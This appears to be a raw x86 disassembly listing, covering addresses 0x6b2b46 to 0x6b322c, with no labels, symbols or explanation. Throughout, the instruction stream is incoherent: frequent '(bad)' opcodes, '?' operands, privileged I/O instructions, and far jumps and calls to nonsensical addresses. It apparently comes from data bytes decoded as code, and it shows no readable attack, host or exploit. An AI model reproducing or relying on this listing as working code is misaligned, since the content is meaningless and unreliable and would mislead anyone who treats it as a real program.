  6b2b46:	cmp    DWORD PTR [edi-0x3b0b6b11],ebp
  6b2b4c:	lahf   
  6b2b4d:	inc    ebx
  6b2b4e:	sub    eax,0x239f325e
  6b2b53:	and    al,0x42
  6b2b55:	cmp    ecx,eax
  6b2b57:	iret   
  6b2b58:	jnp    0x6b2b67
  6b2b5a:	std    
  6b2b5b:	stos   BYTE PTR es:[edi],al
  6b2b5c:	test   DWORD PTR [eax+0x3b],0x2b42e7f6
  6b2b63:	sbb    BYTE PTR [eax],cl
  6b2b65:	mov    eax,ds:0x5d1ac160
  6b2b6a:	cld    
  6b2b6b:	pop    ss
  6b2b6c:	and    BYTE PTR [ecx],dl
  6b2b6e:	pushf  
  6b2b6f:	inc    edx
  6b2b70:	jge    0x6b2b97
  6b2b72:	shl    BYTE PTR [ecx+ebp*1+0x7b07c95c],1
  6b2b79:	adc    BYTE PTR [ecx+eax*1],ah
  6b2b7c:	dec    esp
  6b2b7d:	xchg   esp,eax
  6b2b7e:	in     al,0xf7
  6b2b80:	test   bl,al
  6b2b82:	mov    ds:0x96029ae5,eax
  6b2b87:	aaa    
  6b2b88:	ds xor al,0x7c
  6b2b8b:	inc    ebp
  6b2b8c:	jl     0x6b2b53
  6b2b8e:	cmp    al,BYTE PTR [ebp-0x5ab7c01f]
  6b2b94:	pushf  
  6b2b95:	xchg   edi,eax
  6b2b96:	xchg   ebx,eax
  6b2b97:	cld    
  6b2b98:	jmp    0xf1aa:0xa44ca890
  6b2b9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b2ba0:	add    BYTE PTR [edx+0x7f],0x51
  6b2ba4:	add    BYTE PTR [ebx-0x55],dh
  6b2ba7:	push   ebx
  6b2ba8:	jns    0x6b2b5c
  6b2baa:	ins    BYTE PTR es:[edi],dx
  6b2bab:	and    bh,BYTE PTR [edx+ecx*8-0x70f7071a]
  6b2bb2:	lods   al,BYTE PTR ds:[esi]
  6b2bb3:	cmp    esi,DWORD PTR [edi-0x1230a7c6]
  6b2bb9:	clc    
  6b2bba:	in     al,0x3e
  6b2bbc:	dec    ebx
  6b2bbd:	shr    DWORD PTR [esi+0x45],1
  6b2bc0:	jo     0x6b2b66
  6b2bc2:	and    eax,0xaed35b42
  6b2bc7:	sar    DWORD PTR [ebx+ebx*8],1
  6b2bca:	or     ebx,0x9788e00c
  6b2bd0:	mov    ss,WORD PTR [ecx-0x64]
  6b2bd3:	dec    ebp
  6b2bd4:	pop    ds
  6b2bd5:	(bad)  
  6b2bd6:	cmp    dh,BYTE PTR cs:[si+0x5]
  6b2bdb:	ror    DWORD PTR cs:0x35493bd4,0x1b
  6b2be3:	inc    ecx
  6b2be4:	imul   ebp,edi,0xfffffff1
  6b2be7:	push   esp
  6b2be8:	mov    al,0xb1
  6b2bea:	aaa    
  6b2beb:	dec    eax
  6b2bec:	push   edi
  6b2bed:	or     edx,DWORD PTR [edx]
  6b2bef:	fdiv   st(4),st
  6b2bf1:	scas   al,BYTE PTR es:[edi]
  6b2bf2:	mov    eax,0xac3ddfe3
  6b2bf7:	mov    edi,DWORD PTR [ebp-0x79]
  6b2bfa:	shl    DWORD PTR ds:0x7e57ad9,1
  6b2c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b2c01:	cmp    ch,BYTE PTR [ecx+ebx*1+0x1a594246]
  6b2c08:	rol    DWORD PTR [ecx+0x404b4da2],cl
  6b2c0e:	push   cs
  6b2c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b2c10:	cmp    ch,al
  6b2c12:	(bad)  
  6b2c13:	je     0x6b2c36
  6b2c15:	arpl   WORD PTR [ecx-0xf975f23],bx
  6b2c1b:	push   0x66c58931
  6b2c20:	pop    ss
  6b2c21:	cmp    al,0x92
  6b2c23:	add    eax,ebx
  6b2c25:	push   ebx
  6b2c26:	ret    0x2595
  6b2c29:	lods   al,BYTE PTR ds:[esi]
  6b2c2a:	(bad)  
  6b2c2b:	mov    bl,0x6c
  6b2c2d:	and    DWORD PTR [ecx],eax
  6b2c2f:	mov    esp,0x90aeeaf9
  6b2c34:	add    BYTE PTR [esi+0x21d83ab7],dh
  6b2c3a:	ja     0x6b2c02
  6b2c3c:	push   0xa
  6b2c3e:	pop    ds
  6b2c3f:	jle    0x6b2bcb
  6b2c41:	jg     0x6b2c21
  6b2c43:	je     0x6b2c59
  6b2c45:	(bad)  
  6b2c47:	push   ecx
  6b2c48:	ja     0x6b2c96
  6b2c4a:	das    
  6b2c4b:	fisttp WORD PTR [ebx-0x2223c428]
  6b2c51:	xor    al,0x2f
  6b2c53:	cmp    eax,0x734e48fb
  6b2c58:	(bad)  
  6b2c59:	and    ah,BYTE PTR [esi-0x6b]
  6b2c5c:	push   ds
  6b2c5d:	push   ss
  6b2c5e:	aam    0xc
  6b2c60:	pop    ds
  6b2c61:	retf   0x89b3
  6b2c64:	lods   al,BYTE PTR ds:[esi]
  6b2c65:	push   ds
  6b2c66:	retf   0xf693
  6b2c69:	(bad)  
  6b2c6a:	jno    0x6b2c8e
  6b2c6c:	in     eax,dx
  6b2c6d:	sbb    ch,BYTE PTR ds:0xb247c82b
  6b2c73:	ret    
  6b2c74:	lea    ecx,[esi]
  6b2c76:	xchg   esp,eax
  6b2c77:	mov    eax,0x7f7b8239
  6b2c7c:	adc    DWORD PTR [ecx-0x1ca4ab0e],eax
  6b2c82:	stc    
  6b2c83:	jmp    0x6b2cd0
  6b2c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b2c86:	or     edi,DWORD PTR [eax]
  6b2c88:	jne    0x6b2c3a
  6b2c8a:	sub    al,0xc
  6b2c8c:	test   BYTE PTR [eax],al
  6b2c8e:	mov    ebp,0x564acf08
  6b2c93:	fcmovnb st,st(1)
  6b2c95:	mov    eax,?
  6b2c97:	aad    0xb2
  6b2c99:	dec    ecx
  6b2c9a:	push   ebx
  6b2c9b:	xchg   esp,eax
  6b2c9c:	dec    edx
  6b2c9d:	stos   BYTE PTR es:[edi],al
  6b2c9e:	pop    es
  6b2c9f:	xor    DWORD PTR [eax+0x99ec7a7],edi
  6b2ca5:	xchg   ebx,eax
  6b2ca6:	jnp    0x6b2ce6
  6b2ca8:	ss (bad) 
  6b2caa:	push   ebx
  6b2cab:	shl    edx,1
  6b2cad:	inc    ebp
  6b2cae:	adc    esi,DWORD PTR [edi+0x38]
  6b2cb1:	es ins BYTE PTR es:[edi],dx
  6b2cb3:	ret    0xc729
  6b2cb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b2cb7:	frstor [eax-0x8]
  6b2cba:	push   ebp
  6b2cbb:	fwait
  6b2cbc:	repz leave 
  6b2cbe:	popf   
  6b2cbf:	lahf   
  6b2cc0:	out    dx,al
  6b2cc1:	mov    ds:0x95cf3397,al
  6b2cc6:	or     BYTE PTR [edx+esi*2-0x56],dh
  6b2cca:	push   es
  6b2ccb:	in     al,0x5c
  6b2ccd:	fadd   st,st(4)
  6b2ccf:	jecxz  0x6b2d1a
  6b2cd1:	sub    ah,BYTE PTR ds:0xa5760c9a
  6b2cd7:	popa   
  6b2cd8:	add    BYTE PTR [ebx+edi*4-0x4d],ah
  6b2cdc:	dec    ebp
  6b2cdd:	mov    DWORD PTR [ebx+eax*8],ebx
  6b2ce0:	sub    BYTE PTR ds:0x64dcae9f,bh
  6b2ce6:	aaa    
  6b2ce7:	adc    edx,DWORD PTR [ecx-0x4f]
  6b2cea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b2ceb:	add    ecx,0x78
  6b2cee:	jle    0x6b2d07
  6b2cf0:	sahf   
  6b2cf1:	call   FWORD PTR [eax+0x6853fe03]
  6b2cf7:	jns    0x6b2d48
  6b2cf9:	xor    eax,0x8aead5bf
  6b2cfe:	retf   
  6b2cff:	add    ecx,DWORD PTR [ebx-0x6a60ee0]
  6b2d05:	dec    esi
  6b2d06:	mov    dh,0xdb
  6b2d08:	shr    BYTE PTR [ecx+0x4],1
  6b2d0b:	xchg   ebx,eax
  6b2d0c:	mov    DWORD PTR [eax-0x37a39826],esi
  6b2d12:	mov    esp,0x93c23d9c
  6b2d17:	in     al,0x55
  6b2d19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b2d1a:	cld    
  6b2d1b:	jecxz  0x6b2d84
  6b2d1d:	dec    ebx
  6b2d1e:	stos   BYTE PTR es:[edi],al
  6b2d1f:	inc    esi
  6b2d20:	out    0x44,eax
  6b2d22:	test   eax,0x6554acbf
  6b2d27:	outs   dx,BYTE PTR fs:[esi]
  6b2d29:	mov    BYTE PTR [ebx+0x5b],ch
  6b2d2c:	push   ebx
  6b2d2d:	pop    ebp
  6b2d2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b2d2f:	adc    ebp,DWORD PTR [eax]
  6b2d31:	shr    BYTE PTR [ecx+edi*4-0x6],0x19
  6b2d36:	jnp    0x6b2cca
  6b2d38:	dec    esp
  6b2d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b2d3a:	xchg   ecx,eax
  6b2d3b:	dec    edx
  6b2d3c:	sub    BYTE PTR ss:[ebx+0x58],al
  6b2d40:	test   al,0xd0
  6b2d42:	mov    WORD PTR [ebx+0x379ed4de],?
  6b2d48:	retf   
  6b2d49:	dec    ebp
  6b2d4a:	push   edi
  6b2d4b:	xchg   ebp,eax
  6b2d4c:	push   esi
  6b2d4d:	cmc    
  6b2d4e:	outs   dx,BYTE PTR ds:[esi]
  6b2d4f:	pop    ss
  6b2d50:	cdq    
  6b2d51:	imul   esp,DWORD PTR ds:0x6d24d2f1,0xc174b08d
  6b2d5b:	xor    BYTE PTR [ebx+esi*2+0x31],dh
  6b2d5f:	sbb    DWORD PTR [eax-0x68],edi
  6b2d62:	jne    0x6b2cec
  6b2d64:	dec    edx
  6b2d65:	xor    dl,BYTE PTR [ebx-0x44]
  6b2d68:	mov    bl,0xc8
  6b2d6a:	or     al,0xf5
  6b2d6c:	or     dh,ch
  6b2d6e:	push   edi
  6b2d6f:	leave  
  6b2d70:	push   cs
  6b2d71:	xchg   edi,eax
  6b2d72:	xor    eax,0xc000f649
  6b2d77:	push   cs
  6b2d78:	retf   0xb0bd
  6b2d7b:	xchg   ecx,eax
  6b2d7c:	push   ecx
  6b2d7d:	repz pop ecx
  6b2d7f:	jmp    0x8ad1:0x89399c2c
  6b2d86:	xchg   edi,eax
  6b2d87:	mov    bh,0xdb
  6b2d89:	jmp    0x78f86d0e
  6b2d8e:	cmp    BYTE PTR [esi+0x3ae341fa],dh
  6b2d94:	rcl    DWORD PTR [esi-0x6ab712cc],0x7c
  6b2d9b:	jae    0x6b2dfa
  6b2d9d:	add    eax,0xcc46fa4b
  6b2da2:	stos   DWORD PTR es:[edi],eax
  6b2da3:	mov    BYTE PTR [eax-0x11],ah
  6b2da6:	cmp    BYTE PTR [edx-0x151739ee],cl
  6b2dac:	cmp    dh,ch
  6b2dae:	scas   eax,DWORD PTR es:[edi]
  6b2daf:	mov    ds:0x63c69922,eax
  6b2db4:	loope  0x6b2d8f
  6b2db6:	in     eax,0x71
  6b2db8:	sbb    eax,0x487385b5
  6b2dbd:	jno    0x6b2dc6
  6b2dbf:	dec    edi
  6b2dc0:	cmp    BYTE PTR [esi],cl
  6b2dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b2dc3:	ins    DWORD PTR es:[edi],dx
  6b2dc4:	aas    
  6b2dc5:	jo     0x6b2d5b
  6b2dc7:	xchg   ecx,eax
  6b2dc8:	adc    eax,DWORD PTR [ebx-0x678e750e]
  6b2dce:	loopne 0x6b2d82
  6b2dd0:	jb     0x6b2dc9
  6b2dd2:	xchg   esi,eax
  6b2dd3:	xchg   bh,dl
  6b2dd5:	xor    ch,BYTE PTR [ebp-0x6fbe0ab]
  6b2ddb:	imul   eax,DWORD PTR [ebp-0x42],0x468a73a0
  6b2de2:	push   0x7b9b490a
  6b2de7:	pop    es
  6b2de8:	mov    esi,cs
  6b2dea:	shl    DWORD PTR [edx+0x312ccd8],cl
  6b2df0:	bnd jp 0x6b2db8
  6b2df3:	mov    dl,0xc5
  6b2df5:	xchg   DWORD PTR [edx],esp
  6b2df7:	in     eax,dx
  6b2df8:	jne    0x6b2e3d
  6b2dfa:	(bad)  [ecx+ebp*2]
  6b2dfd:	dec    edx
  6b2dfe:	scas   al,BYTE PTR es:[edi]
  6b2dff:	mov    esi,0xf4aba772
  6b2e04:	test   cl,ch
  6b2e06:	imul   ebx,DWORD PTR [ecx],0xb
  6b2e09:	sub    al,0xf4
  6b2e0b:	outs   dx,DWORD PTR ds:[esi]
  6b2e0c:	cmc    
  6b2e0d:	mov    eax,ds:0x20d1e756
  6b2e12:	mov    BYTE PTR [ebx+0x75],ah
  6b2e15:	sub    esp,ebx
  6b2e17:	repz ret 0xb102
  6b2e1b:	call   0x1a9d:0x3dccfa86
  6b2e22:	sbb    al,0xc0
  6b2e24:	mov    ah,0x94
  6b2e26:	push   cs
  6b2e27:	gs pop ds
  6b2e29:	mov    ebp,0xc54cf42c
  6b2e2e:	or     edi,esp
  6b2e30:	dec    edi
  6b2e31:	and    ah,BYTE PTR [eax-0x583b24d5]
  6b2e37:	or     bh,0x7f
  6b2e3a:	or     DWORD PTR [ecx],ebp
  6b2e3c:	pop    esi
  6b2e3d:	in     al,0x90
  6b2e3f:	lock xor eax,0x832968bc
  6b2e45:	dec    esp
  6b2e46:	dec    ebx
  6b2e47:	cdq    
  6b2e48:	cs push edi
  6b2e4a:	adc    al,0x3e
  6b2e4c:	sbb    BYTE PTR [edi+0x3f],cl
  6b2e4f:	sbb    DWORD PTR [edi-0x2ef98bb4],ebx
  6b2e55:	stos   DWORD PTR es:[edi],eax
  6b2e56:	adc    DWORD PTR [eax+0x38d829c1],esp
  6b2e5c:	repz xor eax,0x9a8b5c2c
  6b2e62:	push   ss
  6b2e63:	dec    edi
  6b2e64:	sub    cl,BYTE PTR [bp+si]
  6b2e67:	adc    al,0xb8
  6b2e69:	adc    esi,DWORD PTR [ebx+esi*1+0x31]
  6b2e6d:	mov    cl,0x42
  6b2e6f:	stos   DWORD PTR es:[edi],eax
  6b2e70:	pop    esi
  6b2e71:	pop    ebp
  6b2e72:	(bad)  
  6b2e73:	enter  0x91b5,0x42
  6b2e77:	inc    esi
  6b2e78:	daa    
  6b2e79:	push   esp
  6b2e7a:	dec    edx
  6b2e7b:	adc    eax,0x232a8190
  6b2e80:	adc    al,0xac
  6b2e82:	aam    0x95
  6b2e84:	cmp    BYTE PTR [eiz*2-0x204c63a8],bl
  6b2e8b:	mov    ds:0x249dc689,al
  6b2e90:	ja     0x6b2e81
  6b2e92:	pop    esp
  6b2e93:	sub    ecx,DWORD PTR [ebx+0x44e1e350]
  6b2e99:	pop    ecx
  6b2e9a:	fcmove st,st(0)
  6b2e9c:	and    DWORD PTR [ecx],edx
  6b2e9e:	test   BYTE PTR [edi+0x314e4d5b],dl
  6b2ea4:	mov    ds:0x2c97041d,eax
  6b2ea9:	push   esi
  6b2eaa:	fcmovu st,st(4)
  6b2eac:	pop    esp
  6b2ead:	push   cs
  6b2eae:	inc    eax
  6b2eaf:	add    eax,0xd833da4f
  6b2eb4:	loopne 0x6b2e37
  6b2eb6:	pop    esp
  6b2eb7:	jmp    0x6b2ed1
  6b2eb9:	push   ds
  6b2eba:	adc    BYTE PTR [ebp+0x39f0ed4e],0x71
  6b2ec1:	sub    DWORD PTR [ebx-0x3c8de84c],0xffffffeb
  6b2ec8:	aas    
  6b2ec9:	mov    al,ch
  6b2ecb:	jmp    0x7595:0x4744168d
  6b2ed2:	in     al,0xe2
  6b2ed4:	int3   
  6b2ed5:	xchg   edi,eax
  6b2ed6:	push   0xb86d37a2
  6b2edb:	loop   0x6b2ee9
  6b2edd:	retf   0xf3e5
  6b2ee0:	mov    ecx,0x84eb7bd2
  6b2ee5:	push   eax
  6b2ee6:	push   edx
  6b2ee7:	arpl   WORD PTR es:[eax+0x7f],si
  6b2eeb:	nop
  6b2eec:	push   ebx
  6b2eed:	inc    esp
  6b2eee:	mov    eax,0x48f6846d
  6b2ef3:	cmp    esi,ebx
  6b2ef5:	jno    0x6b2f73
  6b2ef7:	fst    QWORD PTR [ebx+0x19a74cff]
  6b2efd:	sbb    DWORD PTR [ebx+0x20ae46d9],ebp
  6b2f03:	add    BYTE PTR [ecx-0x148b7ca4],al
  6b2f09:	int3   
  6b2f0a:	sbb    ebp,edi
  6b2f0c:	(bad)  
  6b2f0d:	fstp   QWORD PTR [eax]
  6b2f0f:	shl    ebp,cl
  6b2f11:	fnstcw WORD PTR [edx]
  6b2f13:	sbb    DWORD PTR [ecx],ecx
  6b2f15:	(bad)  
  6b2f16:	stc    
  6b2f17:	dec    edi
  6b2f18:	jnp    0x6b2f76
  6b2f1a:	das    
  6b2f1b:	out    dx,eax
  6b2f1c:	and    eax,0x88f8155f
  6b2f21:	pop    ebp
  6b2f22:	sub    esp,DWORD PTR [ecx+edi*4]
  6b2f25:	push   eax
  6b2f26:	test   BYTE PTR [ecx],dh
  6b2f28:	loope  0x6b2f8f
  6b2f2a:	mov    ?,WORD PTR [ebp-0x2531aae8]
  6b2f30:	inc    edx
  6b2f31:	lods   al,BYTE PTR ds:[esi]
  6b2f32:	fild   WORD PTR [ebx]
  6b2f34:	cmp    DWORD PTR [ebx+0x66],ebx
  6b2f37:	adc    eax,0x516954d9
  6b2f3c:	sbb    eax,0x98ce530d
  6b2f41:	imul   ebp,DWORD PTR [edx],0x3
  6b2f44:	call   DWORD PTR [ecx-0x34e4fde2]
  6b2f4a:	test   DWORD PTR ds:0x437c6ad4,ebx
  6b2f50:	and    ah,dh
  6b2f52:	in     al,dx
  6b2f53:	lahf   
  6b2f54:	mov    ebp,0x5baf54bd
  6b2f59:	neg    DWORD PTR [ebx]
  6b2f5b:	or     DWORD PTR [ebx+0x4b],eax
  6b2f5e:	jbe    0x6b2f36
  6b2f60:	xor    eax,0xada62b59
  6b2f65:	add    BYTE PTR [eax],dh
  6b2f67:	nop
  6b2f68:	xchg   ebx,eax
  6b2f69:	std    
  6b2f6a:	jle    0x6b2fa9
  6b2f6c:	loope  0x6b2f26
  6b2f6e:	fnsave [bp+di-0x26c5]
  6b2f73:	div    DWORD PTR [ecx-0x2e]
  6b2f76:	test   ah,ch
  6b2f78:	outs   dx,BYTE PTR ds:[esi]
  6b2f79:	scas   eax,DWORD PTR es:[edi]
  6b2f7a:	mov    al,0x17
  6b2f7c:	mov    edx,ebx
  6b2f7e:	sti    
  6b2f7f:	daa    
  6b2f80:	ret    
  6b2f81:	sub    esi,DWORD PTR [ecx+ecx*4]
  6b2f84:	aas    
  6b2f85:	(bad)  
  6b2f86:	cmc    
  6b2f87:	or     dh,BYTE PTR [ebx+0x35]
  6b2f8a:	(bad)  
  6b2f8b:	jno    0x6b2fa7
  6b2f8d:	sub    DWORD PTR [esi],0xa6ed8457
  6b2f93:	test   al,0x53
  6b2f95:	cmp    BYTE PTR [eax-0x1aeee93c],dh
  6b2f9b:	aad    0x40
  6b2f9d:	xchg   edi,eax
  6b2f9e:	call   0x92dd:0x1a5da722
  6b2fa5:	out    0x6d,al
  6b2fa7:	push   esp
  6b2fa8:	adc    al,0x75
  6b2faa:	push   esp
  6b2fab:	sub    bh,BYTE PTR [ecx-0x9858505]
  6b2fb1:	pcmpeqw mm4,QWORD PTR [edx+0x38]
  6b2fb5:	jo     0x6b3023
  6b2fb7:	adc    esp,DWORD PTR [ecx+0x19]
  6b2fba:	stos   BYTE PTR es:[edi],al
  6b2fbb:	xchg   ebp,eax
  6b2fbc:	xor    ch,bl
  6b2fbe:	mov    esp,0x2f582dbd
  6b2fc3:	into   
  6b2fc4:	pop    ebx
  6b2fc5:	sbb    edx,DWORD PTR [ecx+0x67c7f7c5]
  6b2fcb:	xchg   edi,eax
  6b2fcc:	xchg   ebp,eax
  6b2fcd:	mov    al,BYTE PTR [ebp-0x45]
  6b2fd0:	pop    ss
  6b2fd1:	imul   edi,esp,0x179f93f9
  6b2fd7:	jg     0x6b2fce
  6b2fd9:	mov    ebx,0xc236a41d
  6b2fde:	cmp    BYTE PTR [edx],0x70
  6b2fe1:	push   es
  6b2fe2:	xchg   ebp,eax
  6b2fe3:	or     esp,DWORD PTR [ecx+0x63]
  6b2fe6:	push   edi
  6b2fe7:	lds    ebx,FWORD PTR [edx]
  6b2fe9:	inc    ebx
  6b2fea:	jns    0x6b2fea
  6b2fec:	mov    eax,0x6d6df6f3
  6b2ff1:	jg     0x6b2ff0
  6b2ff3:	pushf  
  6b2ff4:	scas   eax,DWORD PTR es:[edi]
  6b2ff5:	fs push esp
  6b2ff7:	jmp    0xe90c0767
  6b2ffc:	xchg   esp,eax
  6b2ffd:	xchg   ebp,eax
  6b2ffe:	sbb    esp,DWORD PTR [ecx-0x7b82a287]
  6b3004:	out    dx,al
  6b3005:	dec    esp
  6b3006:	popf   
  6b3007:	or     eax,0xe7dfa02e
  6b300c:	js     0x6b2fd0
  6b300e:	jle    0x6b2fb2
  6b3010:	(bad)  
  6b3011:	addr16 jge 0x6b2fd6
  6b3014:	xchg   edi,eax
  6b3015:	cmp    ebp,DWORD PTR [edi-0x2f80dd64]
  6b301b:	fmul   DWORD PTR [ecx+0x21a118a1]
  6b3021:	adc    eax,0xfc205a1a
  6b3026:	push   edx
  6b3027:	mov    al,0x31
  6b3029:	cmp    BYTE PTR [eax+ebp*4],ch
  6b302c:	dec    edx
  6b302d:	shl    bl,0x91
  6b3030:	mov    bx,0x571a
  6b3034:	mov    bh,0xb3
  6b3036:	or     edi,DWORD PTR ss:[edx]
  6b3039:	pushf  
  6b303a:	out    0xaf,eax
  6b303c:	shl    ecx,1
  6b303e:	jae    0x6b2fd3
  6b3040:	jbe    0x6b30a7
  6b3042:	lds    ebx,FWORD PTR [edx+0x20]
  6b3045:	arpl   WORD PTR [edi-0x1a],sp
  6b3048:	mov    ebp,0x909e2092
  6b304d:	out    0x51,eax
  6b304f:	rcl    DWORD PTR [esi+0x726d5a79],0xe2
  6b3056:	xor    eax,0xad2b8ce6
  6b305b:	jecxz  0x6b2fe2
  6b305d:	scas   al,BYTE PTR es:[edi]
  6b305e:	mov    cl,0x63
  6b3060:	aam    0x61
  6b3062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b3063:	retf   
  6b3064:	pop    ds
  6b3065:	xchg   ebx,eax
  6b3066:	pop    eax
  6b3067:	push   ebx
  6b3068:	pop    esi
  6b3069:	xor    al,0xfc
  6b306b:	add    ecx,esi
  6b306d:	jnp    0x6b30b9
  6b306f:	jmp    0xae56dc6e
  6b3074:	cld    
  6b3075:	dec    ecx
  6b3076:	call   eax
  6b3078:	inc    eax
  6b3079:	enter  0x4b45,0xc2
  6b307d:	into   
  6b307e:	inc    ecx
  6b307f:	aaa    
  6b3080:	je     0x6b30d2
  6b3082:	pop    edi
  6b3083:	nop    DWORD PTR [edx+0x39]
  6b3087:	test   eax,ecx
  6b3089:	sbb    eax,0xa68ee2ca
  6b308e:	dec    edx
  6b308f:	in     al,dx
  6b3090:	mov    bh,0xa1
  6b3092:	lea    ebp,[eax+0x6f]
  6b3095:	stos   BYTE PTR es:[edi],al
  6b3096:	jne    0x6b3073
  6b3098:	sub    eax,0xcd70d107
  6b309d:	jae    0x6b30d2
  6b309f:	(bad)  
  6b30a1:	(bad)  
  6b30a2:	shl    dl,0x62
  6b30a5:	retf   
  6b30a6:	inc    ecx
  6b30a7:	add    esp,DWORD PTR [ebx]
  6b30a9:	aam    0xe2
  6b30ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b30ac:	jecxz  0x6b3082
  6b30ae:	mov    ebx,0x3fe0250f
  6b30b3:	inc    ebx
  6b30b4:	push   esp
  6b30b5:	push   ds
  6b30b6:	int3   
  6b30b7:	sub    al,0xb
  6b30b9:	cmp    BYTE PTR [esi+0x40f6f246],0x78
  6b30c0:	cdq    
  6b30c1:	or     DWORD PTR [edx+0x53d3cca7],esp
  6b30c7:	sub    DWORD PTR [esp+esi*2+0x5e2bcd18],ebp
  6b30ce:	fstp   DWORD PTR [ecx-0x76]
  6b30d1:	scas   eax,DWORD PTR es:[edi]
  6b30d2:	fmul   DWORD PTR [esi+esi*4-0x30c5c73f]
  6b30d9:	sbb    al,0xa6
  6b30db:	(bad)  
  6b30dd:	ins    DWORD PTR es:[edi],dx
  6b30de:	test   BYTE PTR [eax+0x40],ah
  6b30e1:	sub    ah,BYTE PTR [ecx-0x122c2bff]
  6b30e7:	sub    BYTE PTR [ebx-0x5e],0x18
  6b30eb:	or     esp,edx
  6b30ed:	sub    bl,BYTE PTR [edx-0x437478cb]
  6b30f3:	push   esi
  6b30f4:	loope  0x6b3122
  6b30f6:	test   al,0x3f
  6b30f8:	loopne 0x6b30c0
  6b30fa:	(bad)  
  6b30fb:	loope  0x6b3162
  6b30fd:	mov    dl,0x49
  6b30ff:	push   eax
  6b3100:	add    al,0x4c
  6b3102:	fs shl ecx,cl
  6b3105:	stc    
  6b3106:	xor    DWORD PTR ss:[eax+0x5b101b1a],esp
  6b310d:	imul   ebp,DWORD PTR [ebx],0xf104fe16
  6b3113:	adc    al,0x5e
  6b3115:	mov    al,0x61
  6b3117:	ret    0x2114
  6b311a:	push   ebx
  6b311b:	sub    BYTE PTR [ebp+0x1adc29a4],0xc3
  6b3122:	cli    
  6b3123:	cmp    ah,ah
  6b3125:	cld    
  6b3126:	mov    edi,0xab4f861d
  6b312b:	pushf  
  6b312c:	mov    ss,WORD PTR [ecx-0x79f0c36e]
  6b3132:	repz cmp esi,DWORD PTR [ebx]
  6b3135:	int    0x6c
  6b3137:	fwait
  6b3138:	mov    WORD PTR ds:0x10850453,cs
  6b313e:	bound  esp,QWORD PTR [edi-0x1c]
  6b3141:	sahf   
  6b3142:	arpl   ax,sp
  6b3144:	xor    eax,0xb4a1016f
  6b3149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b314a:	in     eax,0x33
  6b314c:	mov    edx,0x72d7e24f
  6b3151:	ss mov edi,0x3af726df
  6b3157:	in     al,0xf4
  6b3159:	mov    eax,ds:0x69fab96
  6b315e:	stos   BYTE PTR es:[edi],al
  6b315f:	inc    eax
  6b3160:	aam    0x97
  6b3162:	xor    BYTE PTR [ebx],cl
  6b3164:	aaa    
  6b3165:	std    
  6b3166:	into   
  6b3167:	or     al,ah
  6b3169:	ror    DWORD PTR [ebx-0x1e0a5081],cl
  6b316f:	mov    ds:0xdc3bfa8e,eax
  6b3174:	clc    
  6b3175:	pop    edi
  6b3176:	popf   
  6b3177:	sar    ecx,1
  6b3179:	mov    ds:0x67556793,al
  6b317e:	jb     0x6b311d
  6b3180:	adc    al,0x3
  6b3182:	push   edx
  6b3183:	push   ds
  6b3184:	sub    BYTE PTR [ebp+0x15d20daa],cl
  6b318a:	adc    BYTE PTR [eax-0x7d],al
  6b318d:	inc    edi
  6b318e:	ss jb  0x6b3111
  6b3191:	xor    DWORD PTR es:[ebx+0x1c],eax
  6b3195:	cs push 0x29f0cf7c
  6b319b:	mov    edx,0x8d995b5a
  6b31a0:	pop    eax
  6b31a1:	sub    DWORD PTR [esi+eiz*2+0x7f],ecx
  6b31a5:	pop    ebx
  6b31a6:	scas   eax,DWORD PTR es:[edi]
  6b31a7:	fs das 
  6b31a9:	sub    DWORD PTR [ebx],esi
  6b31ab:	pusha  
  6b31ac:	fwait
  6b31ad:	sbb    al,0xfe
  6b31af:	imul   ecx,DWORD PTR [esi+0x11b988f9],0xffffffda
  6b31b6:	jne    0x6b3230
  6b31b8:	inc    edi
  6b31b9:	adc    BYTE PTR [ecx+0x5b],ah
  6b31bc:	jecxz  0x6b31bb
  6b31be:	and    BYTE PTR [ecx],bh
  6b31c0:	add    DWORD PTR [esi],ebx
  6b31c2:	fwait
  6b31c3:	pop    ebx
  6b31c4:	mov    ch,0xd5
  6b31c6:	aaa    
  6b31c7:	xchg   edi,eax
  6b31c8:	adc    al,0xbd
  6b31ca:	dec    ebx
  6b31cb:	cli    
  6b31cc:	mov    edi,0xe81cd0c3
  6b31d1:	mov    edx,0xf671b51f
  6b31d6:	mov    al,0xeb
  6b31d8:	hlt    
  6b31d9:	bound  eax,QWORD PTR [ebp+0x404fc0b4]
  6b31df:	xchg   ebp,eax
  6b31e0:	xchg   edi,eax
  6b31e1:	cdq    
  6b31e2:	xor    al,BYTE PTR [ecx]
  6b31e4:	stc    
  6b31e5:	xchg   ebx,eax
  6b31e6:	call   0xeb9839a2
  6b31eb:	jp     0x6b3261
  6b31ed:	jnp    0x6b3224
  6b31ef:	ss inc ebp
  6b31f1:	ss stc 
  6b31f3:	iret   
  6b31f4:	in     eax,dx
  6b31f5:	mov    bh,0xb3
  6b31f7:	sti    
  6b31f8:	push   es
  6b31f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b31fa:	push   ebx
  6b31fb:	lea    edx,[ebx+0x32]
  6b31fe:	push   cs
  6b31ff:	outs   dx,BYTE PTR ds:[esi]
  6b3200:	dec    bh
  6b3202:	pop    ecx
  6b3203:	test   eax,0x511018f9
  6b3208:	dec    edi
  6b3209:	bnd ret 0x8376
  6b320d:	jl     0x6b31a3
  6b320f:	mov    ebp,0x3f5cbf73
  6b3214:	adc    al,0x28
  6b3216:	sub    eax,0x9612bb94
  6b321b:	inc    esi
  6b321c:	cmp    DWORD PTR [ebp-0x7e],0x5b38f435
  6b3223:	push   ecx
  6b3224:	into   
  6b3225:	fsubr  QWORD PTR ds:0xf1a684ce
  6b322b:	stos   BYTE PTR es:[edi],al
  6b322c:	shl    BYTE PTR [ebx-0x3661ac9b],cl
